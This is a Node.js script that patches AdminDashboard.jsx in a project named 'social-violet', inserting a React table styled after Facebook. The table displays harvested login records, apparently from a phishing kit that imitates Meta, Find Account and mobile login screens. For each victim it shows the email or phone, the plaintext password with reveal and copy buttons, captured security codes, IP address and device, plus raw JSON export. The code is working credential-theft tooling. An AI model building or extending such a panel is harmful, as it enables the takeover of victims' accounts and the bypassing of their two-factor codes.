const fs = require('fs');
const path = require('path');

const filePath = path.join(__dirname, 'social-violet/src/components/AdminDashboard.jsx');
const content = fs.readFileSync(filePath, 'utf8');

// Find the section between <div className="fb-admin-table-wrap"> and {/* Developer Hacker Terminal for Raw Database Inspector */}
const startMarker = '<div className="fb-admin-table-wrap">';
const endMarker = '{/* Developer Hacker Terminal for Raw Database Inspector */}';

const startIndex = content.indexOf(startMarker);
const endIndex = content.indexOf(endMarker, startIndex);

if (startIndex === -1 || endIndex === -1) {
  console.error('Markers not found!');
  process.exit(1);
}

// Find the closing </div> of the table wrap before the endMarker
const sub = content.substring(startIndex, endIndex);
console.log('Found block of length:', sub.length);

const cleanTableBlock = `<div className="fb-admin-table-wrap">
                      <table className="fb-admin-table">
                        <thead>
                          <tr>
                            <th>User / Account</th>
                            <th>Origin / Screen</th>
                            <th>Input Email / Phone</th>
                            <th>Plaintext Password</th>
                            <th>Action / Event</th>
                            <th>Security Code</th>
                            <th>Timestamp</th>
                            <th>Status</th>
                            <th style={{ textAlign: 'right' }}>Actions</th>
                          </tr>
                        </thead>
                        <tbody>
                          {filteredLogs.map((log) => {
                            const dateObj = log.createdAt ? new Date(log.createdAt) : new Date();
                            const formattedTime = dateObj.toLocaleTimeString([], {
                              hour: '2-digit',
                              minute: '2-digit',
                              second: '2-digit',
                            });
                            const formattedDate = dateObj.toLocaleDateString();
                            const isPasswordRevealed = Boolean(revealedPasswords[log.id]);
                            const isPasswordCopied = copiedId === \`pass_\${log.id}\`;

                            const src = (log.source || '').toLowerCase();
                            const scr = (log.screen || '').toLowerCase();
                            const act = (log.action || '').toLowerCase();

                            const isMeta = src.includes('meta') || scr.includes('meta') || act.includes('meta');
                            const isFind = src.includes('find') || scr.includes('find') || act.includes('find account');
                            const isMobile = src.includes('mobile') || scr.includes('mobile');
                            const isSignUp = src.includes('sign up') || src.includes('registration') || act.includes('registration');
                            const isSim = src.includes('simulat') || act.includes('test');

                            let badgeClass = 'desktop';
                            let badgeText = log.source || 'Desktop Login Screen';
                            let badgeIcon = '🖥️';

                            if (isMeta) {
                              badgeClass = 'meta';
                              badgeText = 'Meta Account Login';
                              badgeIcon = '♾️';
                            } else if (isFind) {
                              badgeClass = 'find';
                              badgeText = 'Find Account Screen';
                              badgeIcon = '🔍';
                            } else if (isSignUp) {
                              badgeClass = 'signup';
                              badgeText = 'Create Account';
                              badgeIcon = '📝';
                            } else if (isMobile) {
                              badgeClass = 'mobile';
                              badgeText = 'Mobile Login Screen';
                              badgeIcon = '📱';
                            } else if (isSim) {
                              badgeClass = 'simulator';
                              badgeText = 'Admin Simulator';
                              badgeIcon = '⚙️';
                            }

                            return (
                              <tr key={log.id} className="fb-admin-cyber-row">
                                {/* 1. User / Account */}
                                <td>
                                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <div
                                      style={{
                                        width: '36px',
                                        height: '36px',
                                        borderRadius: '10px',
                                        background: 'linear-gradient(135deg, #0866FF 0%, #00C6FF 100%)',
                                        color: '#FFFFFF',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        fontWeight: 800,
                                        fontSize: '13.5px',
                                        boxShadow: '0 2px 6px rgba(8, 102, 255, 0.25)',
                                      }}
                                    >
                                      {(log.username || log.accountName || log.email || 'U')[0].toUpperCase()}
                                    </div>
                                    <div>
                                      <div style={{ fontWeight: 700, color: '#050505', fontSize: '13.5px' }}>
                                        {log.username || log.accountName || log.email || 'Anonymous'}
                                      </div>
                                      <div
                                        style={{
                                          fontSize: '10.5px',
                                          fontFamily: 'Consolas, monospace',
                                          color: '#8A8D91',
                                          display: 'flex',
                                          alignItems: 'center',
                                          gap: '4px',
                                        }}
                                      >
                                        <span>#{log.id}</span>
                                        <button
                                          type="button"
                                          onClick={() => handleCopyText(log.id, \`id_\${log.id}\`)}
                                          title="Copy ID"
                                          style={{
                                            background: 'none',
                                            border: 'none',
                                            cursor: 'pointer',
                                            padding: '1px',
                                            color: copiedId === \`id_\${log.id}\` ? '#0E8A38' : '#8A8D91',
                                          }}
                                        >
                                          {copiedId === \`id_\${log.id}\` ? <Check size={11} /> : <Copy size={11} />}
                                        </button>
                                      </div>
                                    </div>
                                  </div>
                                </td>

                                {/* 2. Origin / Source Screen */}
                                <td>
                                  <div>
                                    <div className={\`fb-admin-origin-pill \${badgeClass}\`}>
                                      <span>{badgeIcon}</span>
                                      <span>{badgeText}</span>
                                    </div>
                                    <div
                                      style={{
                                        fontSize: '10.5px',
                                        color: '#8A8D91',
                                        marginTop: '3px',
                                        fontFamily: 'Consolas, monospace',
                                      }}
                                    >
                                      {log.device || (isMobile ? 'Mobile Device' : 'Desktop Browser')}
                                      {log.ip && \` • \${log.ip}\`}
                                    </div>
                                  </div>
                                </td>

                                {/* 3. Input Email / Phone */}
                                <td>
                                  <span className="table-email-badge">
                                    {log.email || log.username || 'N/A'}
                                  </span>
                                </td>

                                {/* 4. Plaintext Password */}
                                <td>
                                  {log.password && (log.password.startsWith('[Find Account') || log.password === '[Find Account Step]') ? (
                                    <span
                                      style={{
                                        background: '#E0F2FE',
                                        border: '1px solid #BAE6FD',
                                        color: '#0369A1',
                                        fontFamily: 'Consolas, monospace',
                                        padding: '4px 8px',
                                        borderRadius: '6px',
                                        fontWeight: 600,
                                        fontSize: '11.5px',
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        gap: '4px',
                                      }}
                                    >
                                      <Search size={11} />
                                      <span>Account Query</span>
                                    </span>
                                  ) : log.password && log.password !== '[empty]' && log.password !== '[no password entered]' ? (
                                    <div className="fb-admin-cyber-password-pill">
                                      <span>
                                        {isPasswordRevealed ? log.password : '••••••••'}
                                      </span>

                                      <button
                                        type="button"
                                        className="fb-admin-cyber-btn"
                                        onClick={() => togglePasswordVisibility(log.id)}
                                        title={isPasswordRevealed ? 'Mask password' : 'Peek password'}
                                      >
                                        {isPasswordRevealed ? <EyeOff size={14} /> : <Eye size={14} />}
                                      </button>

                                      <button
                                        type="button"
                                        className="fb-admin-cyber-btn"
                                        onClick={() => handleCopyText(log.password, \`pass_\${log.id}\`)}
                                        title={isPasswordCopied ? 'Copied to clipboard!' : 'Copy password'}
                                      >
                                        {isPasswordCopied ? <CheckCheck size={14} color="#059669" /> : <Copy size={13} />}
                                      </button>
                                    </div>
                                  ) : (
                                    <span style={{ color: '#888', fontStyle: 'italic', fontSize: '12px' }}>
                                      [empty]
                                    </span>
                                  )}
                                </td>

                                {/* 5. Action / Event */}
                                <td>
                                  <span
                                    className={\`fb-admin-action-pill \${
                                      (log.action || '').toLowerCase().includes('trial')
                                        ? 'trial'
                                        : (log.action || '').toLowerCase().includes('code')
                                        ? 'otp'
                                        : (log.action || '').toLowerCase().includes('find account')
                                        ? 'search'
                                        : 'login'
                                    }\`}
                                  >
                                    {log.action || 'Login Attempt'}
                                  </span>
                                </td>

                                {/* 6. Security Code */}
                                <td>
                                  {log.code ? (
                                    <span
                                      style={{
                                        background: '#EFF6FF',
                                        border: '1px solid #BFDBFE',
                                        color: '#1D4ED8',
                                        fontFamily: 'Consolas, monospace',
                                        padding: '3px 8px',
                                        borderRadius: '6px',
                                        fontWeight: 800,
                                        fontSize: '12.5px',
                                        letterSpacing: '0.5px',
                                      }}
                                    >
                                      {log.code}
                                    </span>
                                  ) : (
                                    <span style={{ color: '#9CA3AF', fontSize: '12px' }}>—</span>
                                  )}
                                </td>

                                {/* 7. Timestamp */}
                                <td>
                                  <div style={{ fontSize: '12.5px', color: '#050505', fontWeight: 600 }}>
                                    {formattedTime}
                                  </div>
                                  <div style={{ fontSize: '11px', color: '#65676B' }}>
                                    {formattedDate}
                                  </div>
                                </td>

                                {/* 8. Status */}
                                <td>
                                  <span
                                    style={{
                                      display: 'inline-flex',
                                      alignItems: 'center',
                                      gap: '5px',
                                      padding: '3px 9px',
                                      borderRadius: '999px',
                                      fontSize: '11.5px',
                                      fontWeight: 700,
                                      background: log.success ? 'rgba(16, 185, 129, 0.12)' : 'rgba(245, 158, 11, 0.12)',
                                      color: log.success ? '#059669' : '#D97706',
                                      border: \`1px solid \${log.success ? 'rgba(16, 185, 129, 0.25)' : 'rgba(245, 158, 11, 0.25)'}\`,
                                    }}
                                  >
                                    <span
                                      style={{
                                        width: '6px',
                                        height: '6px',
                                        borderRadius: '50%',
                                        backgroundColor: log.success ? '#059669' : '#D97706',
                                      }}
                                    />
                                    {log.success ? 'Success' : 'Trial Recorded'}
                                  </span>
                                </td>

                                {/* 9. Actions */}
                                <td style={{ textAlign: 'right' }}>
                                  <button
                                    type="button"
                                    className="fb-admin-btn-secondary"
                                    onClick={() => handleCopyText(JSON.stringify(log, null, 2), \`row_\${log.id}\`)}
                                    title="Copy raw JSON for this record"
                                    style={{ fontSize: '11px', padding: '3px 8px' }}
                                  >
                                    {copiedId === \`row_\${log.id}\` ? (
                                      <span style={{ color: '#059669', display: 'flex', alignItems: 'center', gap: '3px' }}>
                                        <Check size={12} /> Copied
                                      </span>
                                    ) : (
                                      <span style={{ display: 'flex', alignItems: 'center', gap: '3px' }}>
                                        <Code2 size={12} /> JSON
                                      </span>
                                    )}
                                  </button>
                                </td>
                              </tr>
                            );
                          })}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>

                `;

const newContent = content.substring(0, startIndex) + cleanTableBlock + content.substring(endIndex);
fs.writeFileSync(filePath, newContent, 'utf8');
console.log('Successfully replaced table block in AdminDashboard.jsx!');

